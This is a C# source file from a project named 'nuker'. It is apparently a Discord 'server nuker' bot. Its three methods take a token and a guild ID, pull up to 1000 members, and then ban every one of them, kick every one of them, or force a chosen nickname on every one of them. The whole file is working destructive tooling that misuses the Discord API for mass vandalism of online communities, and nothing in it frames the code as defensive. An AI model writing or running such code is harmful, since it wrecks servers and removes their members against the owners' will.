using Newtonsoft.Json.Linq;
using Console = Colorful.Console;
using System.Drawing;

namespace nuker
{
    public class Bot
    {
        public static void BanAllMembers(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"/guilds/{gid}/members?limit=1000", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/guilds/{gid}/bans/" + entry.user["id"], "PUT", token);
                    Console.WriteLine("Banned: " + entry.user["username"] + "#" + entry.user["discriminator"], Color.Lime);
                }
            }
            catch { Console.WriteLine("Failed. Make sure you've enabled server members intent.", Color.Red); }
        }

        public static void KickAllMembers(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"/guilds/{gid}/members?limit=1000", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/guilds/{gid}/members/" + entry.user["id"], "DELETE", token);
                    Console.WriteLine("Kicked: " + entry.user["username"] + "#" + entry.user["discriminator"], Color.Lime);
                }
            }
            catch { Console.WriteLine("Failed. Make sure you've enabled server members intent.", Color.Red); }
        }

        public static void ChangeAllNicknames(string token, ulong? gid, string nick)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"/guilds/{gid}/members?limit=1000", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/guilds/{gid}/members/" + entry.user["id"], "PATCH", token, $"{{\"nick\":\"{nick}\"}}");
                    Console.WriteLine("Renamed: " + entry.user["username"] + "#" + entry.user["discriminator"], Color.Lime);
                }
            }
            catch { Console.WriteLine("Failed. Make sure you've enabled server members intent.", Color.Red); }
        }
    }
}
